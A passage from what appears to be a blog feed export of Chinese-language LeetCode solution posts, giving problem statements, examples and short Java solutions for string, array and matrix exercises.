<p>假如你可以用 chars 中的『字母』（字符）拼写出 words 中的某个『单词』（字符串），那么我们就认为你掌握了这个单词。</p>
<p>注意：每次拼写（指拼写词汇表中的一个单词）时，chars 中的每个字母都只能用一次。</p>
<p>返回词汇表 words 中你掌握的所有单词的 长度之和。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：words &#x3D; [&quot;cat&quot;,&quot;bt&quot;,&quot;hat&quot;,&quot;tree&quot;], chars &#x3D; &quot;atach&quot;</span><br><span class="line">输出：6</span><br><span class="line">解释： </span><br><span class="line">可以形成字符串 &quot;cat&quot; 和 &quot;hat&quot;，所以答案是 3 + 3 &#x3D; 6。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：words &#x3D; [&quot;hello&quot;,&quot;world&quot;,&quot;leetcode&quot;], chars &#x3D; &quot;welldonehoneyr&quot;</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">可以形成字符串 &quot;hello&quot; 和 &quot;world&quot;，所以答案是 5 + 5 &#x3D; 10。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= words.length &lt;= 1000</li>
<li>1 &lt;= words[i].length, chars.length &lt;= 100</li>
<li>所有字符串中都仅包含小写英文字母</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countCharacters</span><span class="params">(String[] words, String chars)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : chars.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">				map.replace(c, map.get(c) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				map.put(c, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">			<span class="keyword">if</span> (containsWord(word, map)) &#123;</span><br><span class="line">				sum += word.length();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">containsWord</span><span class="params">(String word, Map&lt;Character, Integer&gt;map )</span> </span>&#123;</span><br><span class="line">		Map&lt;Character, Integer&gt; wordMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : word.toCharArray()) &#123;</span><br><span class="line">			wordMap.put(c, wordMap.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> key : wordMap.keySet()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!map.containsKey(key) || wordMap.get(key) &gt; map.get(key)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>1304. 和为零的N个唯一整数</title>
    <url>/2020/04/10/LeetCode/leetcode-001304-%E5%92%8C%E4%B8%BA%E9%9B%B6%E7%9A%84N%E4%B8%AA%E5%94%AF%E4%B8%80%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数 <code>n</code>，请你返回 <strong>任意</strong> 一个由 <code>n</code> 个 <strong>各不相同</strong> 的整数组成的数组，并且这 <code>n</code> 个数相加和为 <code>0</code> 。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 5</span><br><span class="line">输出：[-7,-1,1,3,4]</span><br><span class="line">解释：这些数组也是正确的 [-5,-1,1,2,3]，[-3,-1,2,-2,4]。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 3</span><br><span class="line">输出：[-1,0,1]</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><ul>
<li><code>1 &lt;= n &lt;= 1000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果n是奇数，先填入0，再按照填入区间[-n/2, n/2]的数</p>
<p>如果n是偶数，直接填入区间[-n/2, n/2]的数</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sumZero(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == n % <span class="number">2</span>) &#123;</span><br><span class="line">            index = <span class="number">1</span>;</span><br><span class="line">            n = n - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        n = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">            result[index++] = i;</span><br><span class="line">            result[index++] = -i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1309. 解码字母到整数映射</title>
    <url>/2020/04/10/LeetCode/leetcode-001309.%20%E8%A7%A3%E7%A0%81%E5%AD%97%E6%AF%8D%E5%88%B0%E6%95%B4%E6%95%B0%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 <code>s</code>，它由数字（<code>&#39;0&#39;</code> - <code>&#39;9&#39;</code>）和 <code>&#39;#&#39;</code> 组成。我们希望按下述规则将 <code>s</code> 映射为一些小写英文字符：</p>
<ul>
<li>字符（<code>&#39;a&#39;</code> - <code>&#39;i&#39;</code>）分别用（<code>&#39;1&#39;</code> - <code>&#39;9&#39;</code>）表示。</li>
<li>字符（<code>&#39;j&#39;</code> - <code>&#39;z&#39;</code>）分别用（<code>&#39;10#&#39;</code> - <code>&#39;26#&#39;</code>）表示。 </li>
</ul>
<p>返回映射之后形成的新字符串。</p>
<p>题目数据保证映射始终唯一。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;10#11#12&quot;</span><br><span class="line">输出：&quot;jkab&quot;</span><br><span class="line">解释：&quot;j&quot; -&gt; &quot;10#&quot; , &quot;k&quot; -&gt; &quot;11#&quot; , &quot;a&quot; -&gt; &quot;1&quot; , &quot;b&quot; -&gt; &quot;2&quot;.</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;1326#&quot;</span><br><span class="line">输出：&quot;acz&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;25#&quot;</span><br><span class="line">输出：&quot;y&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;12345678910#11#12#13#14#15#16#17#18#19#20#21#22#23#24#25#26#&quot;</span><br><span class="line">输出：&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;spo&quot;</span><br><span class="line">输出：&quot;ops&quot;</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i]</code> 只包含数字（<code>&#39;0&#39;</code>-<code>&#39;9&#39;</code>）和 <code>&#39;#&#39;</code> 字符。</li>
<li><code>s</code> 是映射始终存在的有效字符串。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历，因为字符串的类型是定的，只可能是1或者3</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">String freqAlphabets(String s) &#123;</span><br><span class="line">		StringBuilder sb = new StringBuilder();</span><br><span class="line">		for (int i = 0; i &lt; s.length(); ++i) &#123;</span><br><span class="line">			if (i + 2 &lt; s.length() &amp;&amp; s.charAt(i + 2) == '#') &#123;</span><br><span class="line">				sb.append((char) ((s.charAt(i) - '0') * 10 + (s.charAt(i + 1) - '1') + 'a'));</span><br><span class="line">				i += 2;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				sb.append((char) (s.charAt(i) - '1' + 'a'));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return sb.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>1148. 文章浏览 I</title>
    <url>/2020/04/10/LeetCode/leetcode-001370.%20%E4%B8%8A%E5%8D%87%E4%B8%8B%E9%99%8D%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 s ，请你根据下面的算法重新构造字符串：</p>
<pre><code>从 s 中选出 最小 的字符，将它 接在 结果字符串的后面。
从 s 剩余字符中选出 最小 的字符，且该字符比上一个添加的字符大，将它 接在 结果字符串后面。
重复步骤 2 ，直到你没法从 s 中选择字符。
从 s 中选出 最大 的字符，将它 接在 结果字符串的后面。
从 s 剩余字符中选出 最大 的字符，且该字符比上一个添加的字符小，将它 接在 结果字符串后面。
重复步骤 5 ，直到你没法从 s 中选择字符。
重复步骤 1 到 6 ，直到 s 中所有字符都已经被选过。</code></pre><p>在任何一步中，如果最小或者最大字符不止一个 ，你可以选择其中任意一个，并将其添加到结果字符串。</p>
<p>请你返回将 s 中字符重新排序后的 结果字符串 。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aaaabbbbcccc&quot;</span><br><span class="line">输出：&quot;abccbaabccba&quot;</span><br><span class="line">解释：第一轮的步骤 1，2，3 后，结果字符串为 result &#x3D; &quot;abc&quot;</span><br><span class="line">第一轮的步骤 4，5，6 后，结果字符串为 result &#x3D; &quot;abccba&quot;</span><br><span class="line">第一轮结束，现在 s &#x3D; &quot;aabbcc&quot; ，我们再次回到步骤 1</span><br><span class="line">第二轮的步骤 1，2，3 后，结果字符串为 result &#x3D; &quot;abccbaabc&quot;</span><br><span class="line">第二轮的步骤 4，5，6 后，结果字符串为 result &#x3D; &quot;abccbaabccba&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><p>查询结果的格式如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;rat&quot;</span><br><span class="line">输出：&quot;art&quot;</span><br><span class="line">解释：单词 &quot;rat&quot; 在上述算法重排序以后变成 &quot;art&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出：&quot;cdelotee&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ggggggg&quot;</span><br><span class="line">输出：&quot;ggggggg&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;spo&quot;</span><br><span class="line">输出：&quot;ops&quot;</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= s.length &lt;= 500</code></li>
<li><code>s</code> 只包含小写英文字母。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用一个字符数组保存字符串，来回顺序遍历和逆序遍历</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">public String sortString(String s) &#123;</span><br><span class="line">		int[] chars = new int[26];</span><br><span class="line">		for (char c : s.toCharArray()) &#123;</span><br><span class="line">			chars[c - 'a']++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		StringBuilder sb = new StringBuilder();</span><br><span class="line">		while (sb.length() != s.length()) &#123;</span><br><span class="line">			for (int i = 0;i &lt; chars.length;i++) &#123;</span><br><span class="line">				if (chars[i] &gt; 0) &#123;</span><br><span class="line">					sb.append((char) (i + 'a'));</span><br><span class="line">					chars[i]<span class="comment">--;</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			for (int i = chars.length - 1;i &gt;= 0;i--) &#123;</span><br><span class="line">				if (chars[i] &gt; 0) &#123;</span><br><span class="line">					sb.append((char) (i + 'a'));</span><br><span class="line">					chars[i]<span class="comment">--;</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>1374. 生成每种字符都是奇数个的字符串</title>
    <url>/2020/04/10/LeetCode/leetcode-001374-%E7%94%9F%E6%88%90%E6%AF%8F%E7%A7%8D%E5%AD%97%E7%AC%A6%E9%83%BD%E6%98%AF%E5%A5%87%E6%95%B0%E4%B8%AA%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数 n，请你返回一个含 n 个字符的字符串，其中每种字符在该字符串中都恰好出现 奇数次 。</p>
<p>返回的字符串必须只含小写英文字母。如果存在多个满足题目要求的字符串，则返回其中任意一个即可。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4</span><br><span class="line">输出：&quot;pppz&quot;</span><br><span class="line">解释：&quot;pppz&quot; 是一个满足题目要求的字符串，因为 &#39;p&#39; 出现 3 次，且 &#39;z&#39; 出现 1 次。当然，还有很多其他字符串也满足题目要求，比如：&quot;ohhh&quot; 和 &quot;love&quot;。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：n = <span class="number">2</span></span><br><span class="line">输出：<span class="string">"xy"</span></span><br><span class="line">解释：<span class="string">"xy"</span> 是一个满足题目要求的字符串，因为 <span class="string">'x'</span> 和 <span class="string">'y'</span> 各出现 <span class="number">1</span> 次。当然，还有很多其他字符串也满足题目要求，比如：<span class="string">"ag"</span> 和 <span class="string">"ur"</span>。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 7</span><br><span class="line">输出：&quot;holasss&quot;</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= n &lt;= 500</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果n是奇数，生成n个a</p>
<p>如果n是偶数，生成n-1个a和1个b</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">generateTheString</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == n % <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// 偶数，n-1个a + b</span></span><br><span class="line">            sb.append(<span class="string">'b'</span>);</span><br><span class="line">            n -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sb.append(<span class="string">'a'</span>);</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1380. 矩阵中的幸运数</title>
    <url>/2020/04/10/LeetCode/leetcode-001380.%20%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E5%B9%B8%E8%BF%90%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个 m * n 的矩阵，矩阵中的数字 各不相同 。请你按 任意 顺序返回矩阵中的所有幸运数。</p>
<p>幸运数是指矩阵中满足同时下列两个条件的元素：</p>
<ul>
<li>在同一行的所有元素中最小</li>
<li>在同一列的所有元素中最大</li>
</ul>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[3,7,8],[9,11,13],[15,16,17]]</span><br><span class="line">输出：[15]</span><br><span class="line">解释：15 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">1</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">2</span>],[<span class="number">9</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">7</span>],[<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">12</span>]]</span><br><span class="line">输出：[<span class="number">12</span>]</span><br><span class="line">解释：<span class="number">12</span> 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[7,8],[1,2]]</span><br><span class="line">输出：[7]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>m == mat.length</li>
<li>n == mat[i].length</li>
<li>1 &lt;= n, m &lt;= 50</li>
<li>1 &lt;= matrix[i][j] &lt;= 10^5</li>
<li>矩阵中的所有元素都是不同的</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">luckyNumbers</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> row = matrix.length;</span><br><span class="line">		<span class="keyword">int</span> col = matrix[<span class="number">0</span>].length;</span><br><span class="line">		<span class="keyword">int</span>[] rows = <span class="keyword">new</span> <span class="keyword">int</span>[row];</span><br><span class="line">		<span class="keyword">int</span>[] cols = <span class="keyword">new</span> <span class="keyword">int</span>[col];</span><br><span class="line">		Arrays.fill(rows, Integer.MAX_VALUE);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> cur = matrix[i][j];</span><br><span class="line">				rows[i] = Math.min(cur, rows[i]);</span><br><span class="line">				cols[j] = Math.max(cur, cols[j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> cur = matrix[i][j];</span><br><span class="line">				<span class="keyword">if</span> (cur == rows[i] &amp;&amp; cur == cols[j]) &#123;</span><br><span class="line">					res.add(cur);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>1385. 两个数组间的距离值</title>
    <url>/2020/04/10/LeetCode/leetcode-001385.%20%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E9%97%B4%E7%9A%84%E8%B7%9D%E7%A6%BB%E5%80%BC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你两个整数数组 arr1 ， arr2 和一个整数 d ，请你返回两个数组之间的 距离值 。</p>
<p>「距离值」 定义为符合此描述的元素数目：对于元素 arr1[i] ，不存在任何元素 arr2[j] 满足 |arr1[i]-arr2[j]| &lt;= d 。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr1 &#x3D; [4,5,8], arr2 &#x3D; [10,9,1,8], d &#x3D; 2</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">对于 arr1[0]&#x3D;4 我们有：</span><br><span class="line">|4-10|&#x3D;6 &gt; d&#x3D;2 </span><br><span class="line">|4-9|&#x3D;5 &gt; d&#x3D;2 </span><br><span class="line">|4-1|&#x3D;3 &gt; d&#x3D;2 </span><br><span class="line">|4-8|&#x3D;4 &gt; d&#x3D;2 </span><br><span class="line">对于 arr1[1]&#x3D;5 我们有：</span><br><span class="line">|5-10|&#x3D;5 &gt; d&#x3D;2 </span><br><span class="line">|5-9|&#x3D;4 &gt; d&#x3D;2 </span><br><span class="line">|5-1|&#x3D;4 &gt; d&#x3D;2 </span><br><span class="line">|5-8|&#x3D;3 &gt; d&#x3D;2</span><br><span class="line">对于 arr1[2]&#x3D;8 我们有：</span><br><span class="line">|8-10|&#x3D;2 &lt;&#x3D; d&#x3D;2</span><br><span class="line">|8-9|&#x3D;1 &lt;&#x3D; d&#x3D;2</span><br><span class="line">|8-1|&#x3D;7 &gt; d&#x3D;2</span><br><span class="line">|8-8|&#x3D;0 &lt;&#x3D; d&#x3D;2</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：arr1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>], arr2 = [-<span class="number">4</span>,-<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>], d = <span class="number">3</span></span><br><span class="line">输出：<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr1 &#x3D; [2,1,100,3], arr2 &#x3D; [-5,-2,10,-3,7], d &#x3D; 6</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= arr1.length, arr2.length &lt;= 500</li>
<li>-10^3 &lt;= arr1[i], arr2[j] &lt;= 10^3</li>
<li>0 &lt;= d &lt;= 100</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findTheDistanceValue</span><span class="params">(<span class="keyword">int</span>[] arr1, <span class="keyword">int</span>[] arr2, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr1.length;i++) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; arr2.length;j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (Math.abs(arr1[i] - arr2[j]) &lt;= d) &#123;</span><br><span class="line">                    flag = <span class="keyword">false</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">			    result++;</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>二分查找</p>
